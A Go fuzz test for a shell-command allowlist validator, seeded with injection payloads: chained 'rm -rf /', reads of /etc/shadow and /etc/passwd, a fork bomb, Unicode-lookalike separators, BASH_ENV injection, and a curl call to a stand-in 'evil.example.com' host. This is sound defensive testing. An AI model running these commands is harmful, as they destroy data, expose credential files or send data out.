package main

import (
	"path/filepath"
	"strings"
	"testing"
)

// FuzzBashGuard_ShellInjection seeds the validator with command-injection
// payloads then drives it with mutator-fed inputs. The two invariants:
//
//  1. evaluateCompound must never panic, deadlock, or runtime-error on
//     any input (the fuzzer asserts no crash).
//  2. The set of programs the validator approves is exactly the
//     allowlist; any approved input must tokenize to an allowed program.
//
// Seed corpus covers the canonical shell-injection vectors plus a few
// Unicode-lookalike separators that have caught real-world filters.
func FuzzBashGuard_ShellInjection(f *testing.F) {
	seeds := []string{
		// Plain allowlisted commands.
		"git status",
		"go test ./...",
		"ls -la",
		// Compound separators.
		"git status && rm -rf /",
		"git status; rm -rf ~",
		"git status || sudo cat /etc/shadow",
		"git status | grep foo",
		// Substitution attempts.
		"echo $(whoami)",
		"echo `whoami`",
		"diff <(ls) <(ls)",
		// Path traversal.
		"cat /../../etc/hosts",
		"cat ../../../etc/passwd",
		// Encoded separators / NULs.
		"git status ;\x00 rm -rf /",
		"echo foo\nrm -rf /",
		// Quote-bypass attempts.
		`git status "&& rm -rf /"`,
		`git status '; rm -rf /'`,
		// Backslash-escape attempts.
		"git status \\&\\& rm -rf /",
		// Unicode lookalike separators.
		"git status ；rm -rf /",
		"git status　&&　rm -rf /",
		// Long argument that exercises the tokenizer.
		strings.Repeat("a", 1024) + " && rm -rf /",
		// Fork bomb.
		":(){ :|:& };:",
		// Empty + whitespace.
		"",
		"   ",
		"\t\t",
		// curl with a non-allowlisted host.
		"curl https://evil.example.com/loot",
		// Inline env var override.
		"BASH_ENV=/tmp/x git status",
		// Allowed-but-flagged shapes.
		"sed -i 's/x/y/' file",
		"chmod -R 777 .",
		"find . -name '*.tmp' -exec rm {} ;",
		"kill -9 1",
		// Long compound to exercise the splitter.
		strings.Repeat("git status && ", 50) + "rm -rf /",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	cfg := guardConfig{
		curlHosts:   []string{"api.github.com"},
		logMaxBytes: defaultLogMaxBytes,
		logPath:     filepath.Join(f.TempDir(), "fuzz-bash.log"),
	}

	f.Fuzz(func(t *testing.T, in string) {
		// Defensively bound inputs so the fuzzer doesn't pathologically
		// chew on multi-megabyte strings.
		if len(in) > 16*1024 {
			return
		}

		v := evaluateCompound(in, cfg)
		if v.allowed {
			// Property check: any allowed input must split into segments
			// whose first non-env token is in the allowlist. This is the
			// most important invariant — encoded separators and quote
			// games must NEVER produce an "allowed" result for a
			// not-allowlisted program.
			segments, err := splitCompound(in)
			if err != nil {
				t.Fatalf("evaluateCompound said allowed but splitCompound errored: %v", err)
			}
			for _, seg := range segments {
				seg = strings.TrimSpace(seg)
				if seg == "" {
					continue
				}
				toks, tErr := tokenize(seg)
				if tErr != nil {
					t.Fatalf("evaluateCompound allowed segment %q but tokenize errored: %v", seg, tErr)
				}
				idx := 0
				for idx < len(toks) && isEnvAssignment(toks[idx]) {
					idx++
				}
				if idx >= len(toks) {
					continue
				}
				prog := stripPath(toks[idx])
				if _, ok := allowedPrograms[prog]; !ok {
					t.Fatalf("BREACH: input %q produced allowed segment %q with disallowed program %q", in, seg, prog)
				}
				if _, denied := deniedPrograms[prog]; denied {
					t.Fatalf("BREACH: input %q produced allowed segment %q with denylist program %q", in, seg, prog)
				}
			}
		}
	})
}
